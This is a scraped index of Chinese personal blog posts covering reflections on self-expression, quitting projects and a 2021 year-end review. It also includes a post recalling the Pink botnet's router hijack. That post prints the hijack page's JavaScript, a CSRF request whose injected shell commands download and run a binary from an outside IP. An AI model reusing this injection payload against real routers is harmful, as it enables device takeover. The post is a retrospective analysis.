除了上面的原因之外，还有一些其他的因素，其中最重要的一点是，我觉得自己的很多观点发布之后不会被理解，很多时候我感觉自己对问题的关注点跟身边其他人不太一样，时间久了后就不再想表达。其实“不会被理解”这只是我自己的想法，我并没有通过大量实践来证明这一点，这是不是一种自负的心理？ 我在知乎上看到一个回答，“我觉得我们不断表达，不断分享，是一种筛选，筛选相似的灵魂。如果不愿表达与分享了，只有两种可能：我不抱有能够找到这样的人的希望了，或者我已经找到了”。我不认为自己已经找到，但也并不是已经放弃了希望，但总觉得很怪。 我怕惹人讨厌 不愿意表达自己的内心，也许是怕惹人讨厌，或者说，怕因为观点(三观)不合，而断绝交往，感觉像是一种敏感的心理。但是我确实会在意别人的看法，表露内心特别是深层次的感情对我来说有不小的困难，或者说心理障碍，我宁愿隐藏起感情。但我会用实际行动去支持我内心的想法。 单纯没有欲望 逐渐远离分享，就好比那天傍晚，一出科研楼大门，便看到那夕阳特殊的颜色和周围炸裂开的云，我不知道该如何描述，云就好像八卦盘一样，一层一层的围绕着夕阳，而每一片又是单独的，夕阳在最中间发出特殊的光辉，好为震撼。我心想，好壮观，好漂亮啊。停下来看了好几秒，却毫无拍下来分享给朋友的意愿。身边有很多人在拍照，我没有这个想法，但我印象中在我初中阶段我是很喜欢拍各种各样的事物的。我不知道这种心理上的变化因何而来，也不知道是好事还是坏事。 人格 下午上课无聊，测试了一下性格，结果显示 [“逻辑学家\"人格]，其中的描述我觉得与我实际情况颇为相似，里面的一些情况虽然我不愿意承认，但是的确存在在我的身上。 ","date":"2022-03-21","objectID":"https://zu1k.com/posts/thinking/low-desire-of-expression/:0:0","series":null,"tags":["thinking"],"title":"我的表达欲在减少","uri":"https://zu1k.com/posts/thinking/low-desire-of-expression/#"},{"categories":["thinking"],"content":"当你在做某一件事，貌似已经陷入其中好多时日，某一天猛然反应过来，好像这件事并没有想像那么重要，你应该弃坑吗？","date":"2022-01-08","objectID":"https://zu1k.com/posts/thinking/continue-or-give-up/","series":null,"tags":["thinking"],"title":"你应该弃坑吗？","uri":"https://zu1k.com/posts/thinking/continue-or-give-up/"},{"categories":["thinking"],"content":"当你在做某一件事，貌似已经陷入其中好多时日，某一天猛然反应过来，好像这件事并没有想像那么重要，你应该弃坑吗？ 我将以自身经历来向你讲述这一点，我已经经历过这样的抉择好多次了。最初还是非常难以割舍，毕竟已经投入了如此多的精力和时间，就此别过总显得虎头蛇尾。但后来我也算是想通了，人的精力总归是有限，应该尽可能的投入到真正想做的事情中，越能够及早的意识到这一点，在这样的抉择面前越能够坦然做出决定。 我也是近几年才意识到这一点，如果没有记错的话，第一次遇到这样的抉择是在三年前。 起初，在某一天我的脑海中突然有了一个想法。人一旦有了想法便总想要去实现一下，于是我便开始着手做这件事，顺便开源出去看看能不能给别人也提供一点便利，说不定还能拉一波人气。事情最初的发展确实符合我的预期，我便投入更多时间，同时对外做了一些宣传工作。 随着关注的人越来越多，我的心态发生了一些变化，我也不知道到这种心态应该如何表达，也许是对项目、对使用者的责任心，夹杂着一丁点虚荣心。项目的使用者越来越多，他们给出了不少反馈，提了一些问题、要求和请求。作为项目维护者，我常常被这些问题和要求折磨，因为责任感的原因，我的邮件通知就像锁魂咒一样，哪怕是在睡觉，一听到那声通知音，我便能立即醒过来，点亮手机查看反馈。如果我觉得能够在短时间内解决这个问题，我甚至能够在大半夜爬起来打开电脑处理这个问题。白天的绝大多数时间我都在做这个项目的开发，甚至拿不出时间出去玩，有时候因为写到兴头，午饭时间都能被我拖到下午一两点。虽然累，但看到问题被一个个解决，项目不断完善，我觉得自己甚至能够想象到使用者满意的眼神，那一段时间确实乐此不疲。 后来某一天，我坐在床上发呆的时候，回想自己这一段时间的经历，发现自己貌似除了这个项目，没有完成其余的任何一件其他的事情。这很可怕。我突然意识到，如果这个东西在未来的某一天突然没有了价值，甚至说它的价值一直以来都是被我高估了，那我在这么长的一个时间内，做了个什么？我是不是，或者说也许一直是在做一件无意义的事情，这些时间都被我浪费了，可怕的是我一直没有意识到这一点，甚至陷入其中乐此不疲。 带着这个想法，我开始重新审视我做的这个项目。首先这个项目的技术并不是非常复杂，任何一个有良好编程基础的人愿意花点时间都可以做出来；然后这个项目的提供的功能貌似是在法律的边缘摩擦，继续开发可能会带来一定的风险；最后这个项目的用户貌似是那么一群乐于白嫖的人。从以上三点出发，我觉得自己这一段时间确实是浪费在一个永远不会有回报的精力黑洞里面了。此时此刻我的心情是非常的复杂，懊悔自己最初做出的选择，同时又对关停这么长时间完成的东西有那么一些不舍。 最后我还是决定终止该项目了。及时止损，任何一个成年人都应该学会这一点，我也刚刚开始领悟这个道理。我觉得这是我弃坑历程的起始点，有了这一次弃坑经历，我在后面的抉择面前，能够更加坦然的做出决定。 现在回到我最初提出的问题：“当你在做某一件事，貌似已经陷入其中好多时日，某一天猛然反应过来，好像这件事并没有想像那么重要，你应该弃坑吗？”。虽然我上面的故事貌似是在鼓励弃坑，但我的本意并非如此。现在我给出我的观点，我认为最重要的是“初心”。 在面临“我应该弃坑吗？”这样的抉择面前，第一件事并不是要赶快反省甚至批判、贬低自己已经完成工作的价值，而是要好好审视一下自己的内心，“我最初到底是想要什么？”，然后根据这个标准，认真评价当前工作是否还在按照实现初心的路径前进。如果因为一些其他的外界事情干扰，工作偏离了航线，则需要判断是否有挽回的机会，毕竟就此放弃是人都会有不甘。如果最终判断这件事确实已经完全偏离了初心，其价值无法满足自己的期望，则应该坚定的终止。除此之外，还应该找个没人的地方，好好的捋一下，看看到底是一开始就错了，还是中途出现的偏离，为未来的决定收集好经验。 到这里，这篇博文算是可以结束了。至于我为什么要写这样一大段文字，主要是我最近看到跟我差不多年纪的年轻人，应该是比我小一点吧，也在沉迷于自己的项目中，没日没夜的维护、解决问题、开发新功能，这些工作耗尽了他几近全部的时间，以至于一直没有时间供他回过头来审视一下。我仿佛从他的身上看到了自己当初的影子，希望他不会像我一样，在某些地方浪费太多的精力，浪费自己大好的青春年华。（这么说好像我年龄好大了一样，我还很年轻好嘛） ","date":"2022-01-08","objectID":"https://zu1k.com/posts/thinking/continue-or-give-up/:0:0","series":null,"tags":["thinking"],"title":"你应该弃坑吗？","uri":"https://zu1k.com/posts/thinking/continue-or-give-up/#"},{"categories":["thinking"],"content":"还有几个小时就要迈进2022的大门，是时候回过头来，再看看我经历过的最不普通的一年了","date":"2021-12-31","objectID":"https://zu1k.com/posts/thinking/2021/","series":null,"tags":["thinking","年终总结"],"title":"2021年终总结","uri":"https://zu1k.com/posts/thinking/2021/"},{"categories":["thinking"],"content":"现在是2021年12月31号晚8点，还有几个小时就要迈进2022的大门。是时候回过头来，再看看我经历过的最不普通的一年了。 ","date":"2021-12-31","objectID":"https://zu1k.com/posts/thinking/2021/:0:0","series":null,"tags":["thinking","年终总结"],"title":"2021年终总结","uri":"https://zu1k.com/posts/thinking/2021/#"},{"categories":["thinking"],"content":"个人相关总结 ","date":"2021-12-31","objectID":"https://zu1k.com/posts/thinking/2021/:1:0","series":null,"tags":["thinking","年终总结"],"title":"2021年终总结","uri":"https://zu1k.com/posts/thinking/2021/#个人相关总结"},{"categories":["thinking"],"content":"学业 首先我要祝贺自己，在2021年6月，顺利结束了大学四年本科生涯，并在今年9月份，开启了研究生新篇章。 我所在的实验室叫“二进制分析实验室”，主要做二进制漏洞自动化发现相关的工作，还有两个师姐在做恶意流量识别的相关内容。在这个人工智能水论文的大潮流下，在我所处的学院，这个实验室应该是唯一一个能够逃离人工智能技术的地方，其实我的师兄师姐大部分也在用人工智能相关技术，但是我的导师给了我足够宽的选择空间，研究方向和使用的技术从我的爱好出发，因此从我的角度而言，无论最终会不会顺利产生成果，能够顺应自己的爱好，这样的研究生3年，应该是不会枯燥和痛苦。 然后是实验室的氛围。我发现周围的实验室好多都好压抑，大家每天在自己的工位上戴着耳机，几乎没有交流，除了卷王就是几乎啥都不会的“搞人工智能调参的那群人”，那样的实验室我是一秒钟也不想待。我们实验室就没有那么压抑，大家每天啥都讨论，无论是学术还是未来就业还是谈女朋友还有八卦新闻，最常谈论的话题就是中午吃什么，隔壁实验室的舍友羡慕我们每天实验室几个人一起出去小聚餐，惬意的很。我的师兄师姐也很关心和照顾我，真不错。 ","date":"2021-12-31","objectID":"https://zu1k.com/posts/thinking/2021/:1:1","series":null,"tags":["thinking","年终总结"],"title":"2021年终总结","uri":"https://zu1k.com/posts/thinking/2021/#学业"},{"categories":["thinking"],"content":"友情 本科毕业，我与众多好友迎来了分别，他们有的进入企业开始自己的职业生涯，有的保研或考研至其他学校，这一别不知还要多久才能再次相见，江湖路远，期待我们都有光明的前途。 我仍然记得晚8点去软件园散步或慢跑的那些夜晚，更记得结束后去麦当劳来个甜筒、去老金来顿烧烤、去美莲整点水果的惬意，那些日子有你们陪伴，真好! 我的本科舍友，黄、尹、李，考研全部成功上岸，祝贺你们。其中尹、李和我在同一校区，黄在另一校区，真是幸运，我们还能继续在科研的道路上共同前进。 9月，我认识了我研究生时期的新舍友，汪、黄、甫，都是非常不错的伙伴，希望我们可以共同奋进，给研究生的3年画卷涂上绚烂的色彩。 ","date":"2021-12-31","objectID":"https://zu1k.com/posts/thinking/2021/:1:2","series":null,"tags":["thinking","年终总结"],"title":"2021年终总结","uri":"https://zu1k.com/posts/thinking/2021/#友情"},{"categories":["thinking"],"content":"家庭 这一年，很明显能够看出父母亲又年老了。我很惭愧，对我的家庭非常惭愧，已经二十多岁的人了，还没有成为家里的顶梁柱，父亲还是需要在冰冷的海水里赚钱养家，母亲的腰也因为每天的操劳而生病甚至需要因此做手术。 不过21年也仍然是幸福的一年，家庭仍然温馨和睦。上研究生以来发了不少奖金，每个月也有不少生活补助，无需再跟家里要钱，还给家里打了几万块钱，给父亲买了新手机。我自己倒还没有换新手机，暂时觉得没有必要，毕竟再战3年可不是说着玩的。 好久没给爷爷奶奶打过电话了，不过再过不久就可以回家了，想必爷爷奶奶也想我了。 ","date":"2021-12-31","objectID":"https://zu1k.com/posts/thinking/2021/:1:3","series":null,"tags":["thinking","年终总结"],"title":"2021年终总结","uri":"https://zu1k.com/posts/thinking/2021/#家庭"},{"categories":["thinking"],"content":"我的生日 小时候每年都要过生日，长大后其实对这个就不在意了，上研究生后我也没有告诉任何人。加上正好是考试月，忙着复习，今年我自己也给忘记了，直到生日前一天我都没有发现。 父母仍然记着，提起一天发来了祝福和红包。 ","date":"2021-12-31","objectID":"https://zu1k.com/posts/thinking/2021/:1:4","series":null,"tags":["thinking","年终总结"],"title":"2021年终总结","uri":"https://zu1k.com/posts/thinking/2021/#我的生日"},{"categories":["thinking"],"content":"我的感情 对我自己说，很抱歉，还没有女朋友 上半年，尝试追一女同学，开始时交流了很多，也感觉亲近了很多，时常半夜聊到凌晨两三点，后来淡了 算是失败了，我也被之前的舍友亲切的称为“天勾”，草！ 我反思自己，第一，不能自卑，第二，要主动一点，第三，要大胆一点，反思完毕。 ","date":"2021-12-31","objectID":"https://zu1k.com/posts/thinking/2021/:1:5","series":null,"tags":["thinking","年终总结"],"title":"2021年终总结","uri":"https://zu1k.com/posts/thinking/2021/#我的感情"},{"categories":["thinking"],"content":"开始用Rust写程序 20年因为某些机缘巧合了解到Rust并且开始想要学习，但尝试了好几次都没有坚持下去，再加上那段时间我对Go情有独钟，这个事就一拖再拖。 今年2月份Rust基金会成立，看到了相关新闻，Mozilla、AWS、Google、微软、华为等顶级企业或组织是其第一批成员，这坚定了我使用rust的信念。事实证明我的决定没问题，连挑剔的Linus都接受了Rust对内核开发的涉足，这是cpp都没有的待遇。 刚看了一下我的仓库列表，今年在9个项目中主力使用Rust开发，根据wakatime统计的数据，写rust时长接近200小时，总行数超过4w行(只计算了增加的行数，没有计算删除的行数)。 Rust已经成为我最喜欢的编程语言了，这是事实，虽然一次性小脚本我还是会用py，需要并发的临时小工具我还是会用go，和同学合作我还是会用java，但是我新开启的项目已经首选rust了。Rust的性能和表达能力都很优秀，就业岗位暂时不是很多意味着还没有很卷，大企业和linux对rust的关注代表着它的前途，希望身边还没有开始Rust的同学马上开始行动。（我就是Rust吹，宣传小能手，身边3个同学开始动身学习rust了） ","date":"2021-12-31","objectID":"https://zu1k.com/posts/thinking/2021/:1:6","series":null,"tags":["thinking","年终总结"],"title":"2021年终总结","uri":"https://zu1k.com/posts/thinking/2021/#开始用rust写程序"},{"categories":["thinking"],"content":"参与开源项目 参加了今年的“开源软件供应链点亮计划”，体验不错。项目用的go，需求比较简单，主要代码一两个晚上搞定，然后根据社区导师的建议小修小补。感谢社区导师@xuanwo, 给我提供了不少帮助。推荐学弟学妹们参加这个活动，有钱！中等难度项目9000块，赚的非常轻松。 在某群看到了SOFAStack社区发布的小任务，就给他们的Layotto项目做了两个PR，顺便学习了wasm相关知识，特别是使用wasm写插件系统时，能力引入(导入表)和变长参数传递相关内容有了更加深入的了解。拿到了证书和马克杯，感谢。 写copy-translator项目时，给egui库做了几个小贡献，没想到头像居然出现在前10了，还被同样在学习rust的好朋友发现了，真不错。 今年总共有3个项目曾进入过GitHub Trending，分别是 Golang写的proxypool（一个已经弃坑的项目，没想到还这么受欢迎）、copy-translator、good-mitm，后两个都是rust写的。 GitHub Followers数目在2021年突破1k。 参与开源的感觉真心不错，22年再接再励！ ","date":"2021-12-31","objectID":"https://zu1k.com/posts/thinking/2021/:1:7","series":null,"tags":["thinking","年终总结"],"title":"2021年终总结","uri":"https://zu1k.com/posts/thinking/2021/#参与开源项目"},{"categories":["thinking"],"content":"被邀请实习 这里开始吹嘘自己 因为写了《IPFS新手指北》，Protocol Labs问有没有兴趣\"working internally with Protocol Labs\"。（那必须的，我很感兴趣，我喜欢这些东西！） 因为写了copy-translator，某IM初创团队私信问我\"有没有兴趣一起做一些有挑战的事情\"。（曾经真的有一段时间我特别想做一款IM，我很感兴趣！） 因为写了《从最近披露的Pink僵尸网络想到的》，收到360 Netlab的邀请。（说真的，接到电话的我感到受宠若惊，了解后发现他们在做的东西这不就是我想搞的嘛，这可太感兴趣了！） 可能是从GitHub Trending看到了我，收到了Shopee Singapore的HR发来的邮件，真不错，以后有机会想run去新加坡。 他们都是非常有吸引力的团队，我也非常希望自己能够参与其中。但是因为某些原因，我暂时没有办法集中精力投入自己的全身心，这里只能说一声抱歉，希望未来的某一天，我们可以一起为同一个目标努力。 同时，我也想告诉我身边的同学和我的朋友，写博客和做开源项目真的可以起到宣传自己的作用哈哈哈。 ","date":"2021-12-31","objectID":"https://zu1k.com/posts/thinking/2021/:1:8","series":null,"tags":["thinking","年终总结"],"title":"2021年终总结","uri":"https://zu1k.com/posts/thinking/2021/#被邀请实习"},{"categories":["thinking"],"content":"内卷的加重 这部分看过我《干！有人在卷我》这篇文章的同学能够看懂。 还是那个任课老师，听同学说，他今年在课上，说起字数的问题，“去年没有说字数的问题，很多同学问字数的问题，今年强调一下，我们没有字数限制。。。。” 然后，我那那篇文章，实验室一同学在某节课讨论时，被不小心传播开了。哈哈，听说他们今年已经开始1w起步了，身边有人已经写1w7了，这就是内卷的加重啊 然后，学校旁边的羊汤店，还在卷，饼可以免费不限量吃了。 ","date":"2021-12-31","objectID":"https://zu1k.com/posts/thinking/2021/:1:9","series":null,"tags":["thinking","年终总结"],"title":"2021年终总结","uri":"https://zu1k.com/posts/thinking/2021/#内卷的加重"},{"categories":["thinking"],"content":"行业相关总结 我是比较关注新闻的，特别是计算机、互联网相关行业，今年看到不少新闻，也不知道是今年不太平还是我之前不够关注这方面 ","date":"2021-12-31","objectID":"https://zu1k.com/posts/thinking/2021/:2:0","series":null,"tags":["thinking","年终总结"],"title":"2021年终总结","uri":"https://zu1k.com/posts/thinking/2021/#行业相关总结"},{"categories":["thinking"],"content":"裁员 就是近两个月，已经接连听到国内二十多家互联网公司大幅裁员的新闻，我已经工作的朋友之间传着即将迎来“互联网寒冬”的话，也看到了国外某企业通过zoom会议裁员被喷的故事。 已经工作的好友想赚够留学的钱然后润(run)去欧州读PhD 同时，今年我还见证了一纸文书毁灭整个课外辅导、在线教育行业。今年年初，我还在和朋友谈论某某本科同学顺利拿到猿辅导SSP，总包60W，而就在今年，也不知道他来没来得及转正，反正肯定被裁了，太倒霉了。 ","date":"2021-12-31","objectID":"https://zu1k.com/posts/thinking/2021/:2:1","series":null,"tags":["thinking","年终总结"],"title":"2021年终总结","uri":"https://zu1k.com/posts/thinking/2021/#裁员"},{"categories":["thinking"],"content":"大佬去世 Redox OS活跃贡献者jD91mZM2今年在不正常的离线时间后，被证实去世，证据指向精神健康事件后的自杀，Redox官方发文呼吁要《关注开源贡献者的心理健康》。 “The code doesn’t write itself, and the person writing the code needs even more maintenance than the “open source” itself.” 这个月，前段时间，听说腾讯天美一员工自杀，后来证实是毛星云大佬，也不知道是不是心理健康原因。让我震惊的是腾讯对消息的封锁，在腾讯工作的同学说，内部谈论这个事是被禁止的，所以即使是他们也只能从外部途径才知道去世的是毛星云，真是讽刺。 对了，我们也不能忘记，21年二十多位院士逝世，他们献身科研，一生为国尽瘁，让我们向他们致敬。 ","date":"2021-12-31","objectID":"https://zu1k.com/posts/thinking/2021/:2:2","series":null,"tags":["thinking","年终总结"],"title":"2021年终总结","uri":"https://zu1k.com/posts/thinking/2021/#大佬去世"},{"categories":["thinking"],"content":"劳动者权益 这是前段时间看到的新闻，南山必胜客败诉给一个员工，根据劳动法等相关法律。说明我们不能怂 ","date":"2021-12-31","objectID":"https://zu1k.com/posts/thinking/2021/:2:3","series":null,"tags":["thinking","年终总结"],"title":"2021年终总结","uri":"https://zu1k.com/posts/thinking/2021/#劳动者权益"},{"categories":["thinking"],"content":"漏洞 Apache Log4j RCE漏洞，全球很多顶级的企业受影响 这个事件我们看到： 开源项目没有收到赞助，全靠用爱发电。这样不对！ 情报披露问题，阿里云被罚 互联网好脆弱啊，基础组件就这么不受关注嘛？ 然后，我还想到了今年看到的一些文章和亲身经历过的攻击，针对安全研究人员的攻击真的越来越多了： 我中了水坑，利用浏览器相关漏洞给我植入了木马，还被某部门上门 泄漏的IDA含有后门 针对安全工具反打的方式（以后得格外小心了） Log4j这个洞出来后，马上出现了在某些段写payload的方式攻击Ghidra 我还想说，国内的安全研究环境越来越差了，特别是政策方面 ","date":"2021-12-31","objectID":"https://zu1k.com/posts/thinking/2021/:2:4","series":null,"tags":["thinking","年终总结"],"title":"2021年终总结","uri":"https://zu1k.com/posts/thinking/2021/#漏洞"},{"categories":["thinking"],"content":"讨论的消亡 最近吃的瓜有点多，无论是娱乐圈还是政圈 有的瓜被证实了，有的瓜却迟迟没有\"辟谣\"，也不知道是真谣还是假谣 肉眼可见的是豆瓣、知乎、微博等平台，评论的收紧、限制等措施 然后，今天看到的新闻：阿里巴巴出售旗下weibo的全部股份，微薄将成为30%国资媒体。新新闻，不多评论了 推荐一篇文章：中文互联网中“讨论”的消亡 ","date":"2021-12-31","objectID":"https://zu1k.com/posts/thinking/2021/:2:5","series":null,"tags":["thinking","年终总结"],"title":"2021年终总结","uri":"https://zu1k.com/posts/thinking/2021/#讨论的消亡"},{"categories":["thinking"],"content":"互联网中心化的脆弱性 fastly炸掉，全球顶级网站几乎全部不可用 不得不反思，当互联网走向集中化，当巨头控制绝大多数资源，当选择变得唯一，一切都会变得极其脆弱。 IPFS所倡导的分布式web会是未来吗？我不知道答案，但是尝试总是好的 ","date":"2021-12-31","objectID":"https://zu1k.com/posts/thinking/2021/:2:6","series":null,"tags":["thinking","年终总结"],"title":"2021年终总结","uri":"https://zu1k.com/posts/thinking/2021/#互联网中心化的脆弱性"},{"categories":["thinking"],"content":"GitHub Copilot GitHub用其托管的代码训练的人工智能，能够有效协助写代码，特别是py,js等。 但是当我使用Rust时，它的自动补全甚至成为了我的累赘，不断的自以为是打断我的思路，因此我把它关闭了。 ","date":"2021-12-31","objectID":"https://zu1k.com/posts/thinking/2021/:2:7","series":null,"tags":["thinking","年终总结"],"title":"2021年终总结","uri":"https://zu1k.com/posts/thinking/2021/#github-copilot"},{"categories":["thinking"],"content":"炒币、挖矿、元宇宙 舍友沉迷炒币、挖矿、元宇宙 我不看好，但是不介意在这个没有监管的地方捞一笔 ","date":"2021-12-31","objectID":"https://zu1k.com/posts/thinking/2021/:2:8","series":null,"tags":["thinking","年终总结"],"title":"2021年终总结","uri":"https://zu1k.com/posts/thinking/2021/#炒币挖矿元宇宙"},{"categories":["thinking"],"content":"疫情的现状 变异的病毒在传播，情况不容乐观 我也没深究，听说mRNA疫苗修改起来简单，可快速开发适合变异后病毒的疫苗，真是厉害啊，一开始他们就想到这一步了吗？如果是，还是得努力追赶啊。 最近又听说已经有特效药了，厉害啊。 看到最近西安相关新闻，我跟我妈妈说要稍微屯点东西。 ","date":"2021-12-31","objectID":"https://zu1k.com/posts/thinking/2021/:2:9","series":null,"tags":["thinking","年终总结"],"title":"2021年终总结","uri":"https://zu1k.com/posts/thinking/2021/#疫情的现状"},{"categories":["thinking"],"content":"思考 这一年，因为看到、听到、经历到的各种事情，我也开始对人生、对理想、对未来、对社会、对人进行了更加深入的思考。这些思考还未形成文字，很多只是心里的一个想法，还需要后面的人生经历进行巩固和验证。 有几点比较自私的想法，我想记录在2021年，供未来的我思考和批判 以改变阶级层次为最终目标 程序员要努力活得久 家庭幸福、开心最重要 是不是很自私？不要嘲笑我！ 好了，现在是21年12月31日22点42分，是时候关闭电脑回宿舍了。 2022，你好！ ","date":"2021-12-31","objectID":"https://zu1k.com/posts/thinking/2021/:3:0","series":null,"tags":["thinking","年终总结"],"title":"2021年终总结","uri":"https://zu1k.com/posts/thinking/2021/#思考"},{"categories":["event"],"content":"昨天看到的文章《一个藏在我们身边的巨型僵尸网络 Pink》让我想起了20年初的一起光猫升级事件，以及我对这次事件的一些想法","date":"2021-10-27","objectID":"https://zu1k.com/posts/events/pinkbot/","series":null,"tags":["event"],"title":"从最近披露的Pink僵尸网络想到的","uri":"https://zu1k.com/posts/events/pinkbot/"},{"categories":["event"],"content":"昨天上课的时候无聊刷V2EX，读到 360 Netlab 发布的文章《一个藏在我们身边的巨型僵尸网络 Pink》，披露了2019年底到2020年春节前后的一个名为\"Pink“的巨型僵尸网络从被发现到攻防博弈过程的一些细节 文中的攻防过程令我很是激动，因为我想起了在2020年初的一件事 ","date":"2021-10-27","objectID":"https://zu1k.com/posts/events/pinkbot/:0:0","series":null,"tags":["event"],"title":"从最近披露的Pink僵尸网络想到的","uri":"https://zu1k.com/posts/events/pinkbot/#"},{"categories":["event"],"content":"光猫升级事件 2020年1月初，访问某些http协议(80端口)的网站，会被劫持到一个联通光猫升级页面 百度贴吧被劫持到升级页面 信息 对这个页面的源码在gist上进行了备份，感兴趣的同学可以看一下 9923 行 ","date":"2021-10-27","objectID":"https://zu1k.com/posts/events/pinkbot/:1:0","series":null,"tags":["event"],"title":"从最近披露的Pink僵尸网络想到的","uri":"https://zu1k.com/posts/events/pinkbot/#光猫升级事件"},{"categories":["event"],"content":"官方后门 通过查看请求和页面源码可以发现这个页面通过想”192.168.1.1“的某个接口进行jsonp请求来执行命令 function ajax(){ //document.getElementById(\"tip\").innerHTML=\"请重启光猫，并保持页面不关闭，重启后请立即连接光猫WIFI或者网口，等待五分钟后检查网络是否正常\"; $.ajax( { dataType: 'jsonp', data: \"\", jsonp: 'callback', url: 'http://192.168.1.1/createNewFolder.json?enlpassword=1234567890abcdefx1234567890abcdefxx1234567890abcdefxxx1eee;iptables -I OUTPUT -p tcp --dport 443 -j DROP;iptables -I OUTPUT -p udp --dport 123 -j DROP;if [ ! -f /tmp/sdsjw ] %26%26 wget http://182.43.249.225:19735/sdsjw -P /tmp;then chmod 777 /tmp/sdsjw;/tmp/sdsjw;fi; /jsonp?', success: function (data) { console.log(JSON.stringify(data)); // 这里是返回数据 //document.getElementById(\"tip\").innerHTML=\"设备正在升级，请等待五分钟后检查网络是否正常\"; }, error:function(XLMHttpResponse,textStatus,errorThrown){ if(XLMHttpResponse.status == 200){ //document.getElementById(\"tip\").innerHTML=\"设备正在升级，请等待五分钟后检查网络是否正常\"; } }, complete:function(XLMHttpResponse){ if(XLMHttpResponse.status == 200){ //document.getElementById(\"tip\").innerHTML=\"设备正在升级，请等待五分钟后检查网络是否正常\"; } } } ); } 很明显，这是一个后门，或者是一个漏洞，我更相信这是一个官方后门 根据它的写法我稍微测试了一下，通过jsonp跨域，进行CSRF，的确可以执行任意命令 测试后门 如果被利用了，岂不是？？？又有谁知道到底是不是已经被利用了呢，反正我不知道 信息 我很早之前就把光猫设置为桥接模式了，利用自己的路由器拨号，不受该后门影响 局域网也改为另外一个网段了，“192.168.1.1” 根本没有机器 再回过头来看升级页面执行的shell命令: iptables -I OUTPUT -p tcp --dport 443 -j DROP; iptables -I OUTPUT -p udp --dport 123 -j DROP; if [ ! -f /tmp/sdsjw ] \u0026\u0026 wget http://182.43.249.225:19735/sdsjw -P /tmp; then chmod 777 /tmp/sdsjw; /tmp/sdsjw; fi; /jsonp? 当初看这段命令的时候就觉得非常奇怪 为什么上来第一句就要阻断到所有目标443端口的tcp连接？当初的一个想法是防止用户用https协议，这样用户只能使用80端口的http明文协议，可以进行监听或者劫持等操作。这样也不合理啊，HSTS也不是吃干饭的，再说联通如果通过更新屏蔽掉到443端口的所有请求，不怕用户集体反馈和投诉吗？反正当初是没想通这个谜之操作 再看第二句，也莫名其妙，udp 123端口是NTP服务，找你惹你了，犯不着全部屏蔽掉吧。还是想不明白 往后的命令就比较常规了，下载了一个二进制程序，权限修改为777，然后直接执行 ","date":"2021-10-27","objectID":"https://zu1k.com/posts/events/pinkbot/:1:1","series":null,"tags":["event"],"title":"从最近披露的Pink僵尸网络想到的","uri":"https://zu1k.com/posts/events/pinkbot/#官方后门"},{"categories":["event"],"content":"怀疑被攻击 通过对上面升级执行的命令进行分析，我觉得这些操作很不符合常理，将这些已知信息在小群里交流之后，怀疑可能是一起攻击事件，通过劫持用户的http访问，利用光猫的后门(可能是漏洞，虽然我不信)植入恶意程序 遂决定对sdsjw程序进行逆向分析，分析的枯燥过程这里省略了，最后结果就是没有发现什么异常的点，到这里对这个事件的分析便不了了之了（当初的二进制程序我找不到了，现在也下载不到了） 信息 通过逆向mips版的升级程序，我得出了两个结论： JEB的MIPS逆向体验很不错 毛子的JEB破解版真好用 ","date":"2021-10-27","objectID":"https://zu1k.com/posts/events/pinkbot/:1:2","series":null,"tags":["event"],"title":"从最近披露的Pink僵尸网络想到的","uri":"https://zu1k.com/posts/events/pinkbot/#怀疑被攻击"},{"categories":["event"],"content":"联通工作人员上门升级 2020年5月10号下午，联通工作人员上门进行光猫升级。具体升级方法就是把一块板子通过光猫侧面的口插到主板上，然后通过手机上的app进行固件刷写 在交流的过程中，他透漏光猫大批量被控，有对外攻击流量，接上面要求需要对所有光猫进行升级。我家的光猫在线升级失败，只能到户手动完成。我看了一下他需要上门的名单，看样子我们这个区域关闭了在线管理接口的用户还不少啊哈哈哈 联通工作人员上门升级 ","date":"2021-10-27","objectID":"https://zu1k.com/posts/events/pinkbot/:1:3","series":null,"tags":["event"],"title":"从最近披露的Pink僵尸网络想到的","uri":"https://zu1k.com/posts/events/pinkbot/#联通工作人员上门升级"},{"categories":["event"],"content":"我在第一层，人家在第5层 虽然这个事已经过去一年多了，但现在想起来还是有那么一些感触，在运营商与黑客的一轮又一轮攻防博弈中，我有幸记录下其中某个小小的过程。在信息还未对外揭露之前，我无法理解那些莫名其妙的升级指令，甚至怀疑那是一起攻击事件，利用自己微不足道的知识尝试分析却不得结果。当保密期过去之时，我们得以看到整个事件的原貌，不禁感叹，我还是太年轻了啊（好像听到了“长者”的话） ","date":"2021-10-27","objectID":"https://zu1k.com/posts/events/pinkbot/:2:0","series":null,"tags":["event"],"title":"从最近披露的Pink僵尸网络想到的","uri":"https://zu1k.com/posts/events/pinkbot/#我在第一层人家在第5层"},{"categories":["event"],"content":"关于看待事情 所谓“管中窥豹，略见一斑”，从这件事我学到的第一点便是，要有大局观，要广泛的收集信息，看待某件事时要把时间线放长，这样才能去尽力触及事情的真相 ","date":"2021-10-27","objectID":"https://zu1k.com/posts/events/pinkbot/:2:1","series":null,"tags":["event"],"title":"从最近披露的Pink僵尸网络想到的","uri":"https://zu1k.com/posts/events/pinkbot/#关于看待事情"},{"categories":["event"],"content":"关于现代网络攻击 我学到的第二点是关于现代网络攻击。我觉得我对网络攻击的印象还停留在早年的那些简单的漏洞利用，虽然近几年通过网络也吃了不少现代网络攻击事件的瓜，但是并未意识到真正的网络攻击就潜伏在你我身边 通过本次事件我们可以清晰的看出，现代的网络攻击使用的技术更加先进，对隐匿性的要求也更高，如果不是有广泛的监控难以发现。在遇到厂商的狙杀时攻击者能够在第一时间绕过和阻拦，甚至能够在多轮对抗中取得优势将厂商直接阻拦在门外，夺取绝对的控制权，逼迫厂商只能线下进行上门修复 简单列几句文中的原话： “至对光猫固件做了多处改动后，还能确保光猫能够正常使用” “在与相关厂商的屡次攻防博弈中，PinkBot 的运营者都占据了明显的对抗优势” “PinkBot 在整个过程中表现出了极强的针对性和专业性，各方面能力都很均衡，甚至有些可怕” “攻击者还使用了ecdsa对配置信息进行了签名” 我觉得不可思议的是这一句： “我们一直阶段性的对公网上的 Pink 节点进行持续监测，通过对 2021/10/20日的日志分析，我们仍然可以看到 103024 个 IP 处于日活状态。这表明，当前的 pink 的感染规模仍然在 10w 量级左右，涉及多家设备厂商，按照每个IP对应一个三口之家来计算，受影响人群大概 30w 人左右” 被发现近2年，竟然还没有清除干净，这存活能力得有多强，难以想象 结论：攻击者能力很强，未来遭遇的攻击会更加专业和可怕 ","date":"2021-10-27","objectID":"https://zu1k.com/posts/events/pinkbot/:2:2","series":null,"tags":["event"],"title":"从最近披露的Pink僵尸网络想到的","uri":"https://zu1k.com/posts/events/pinkbot/#关于现代网络攻击"},{"categories":["event"],"content":"关于个人安全 